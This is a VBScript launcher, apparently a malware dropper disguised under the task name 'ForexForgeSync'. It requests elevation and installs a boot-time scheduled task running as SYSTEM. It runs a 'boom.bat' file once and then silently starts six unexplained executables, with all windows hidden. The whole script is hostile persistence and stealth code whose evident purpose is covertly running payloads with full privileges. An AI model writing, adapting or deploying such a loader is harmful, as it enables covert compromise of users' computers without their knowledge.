Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION ---
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL SYSTEM-LEVEL TASK ---
' /RU "SYSTEM" runs it in a hidden session where NO windows can exist
strTaskName = "ForexForgeSync"
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onstart /rl highest /ru ""SYSTEM"" /f"

' We use /sc onstart so it runs the moment the PC boots, before login
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: RUN BOOM.BAT (First time only) ---
If WScript.Arguments.Named.Exists("elevate") Then
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: SILENT EXECUTION ---
' This 30s wait now happens in the background "Session 0"
WScript.Sleep 30000 

' Use absolute paths so the SYSTEM account doesn't get lost
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
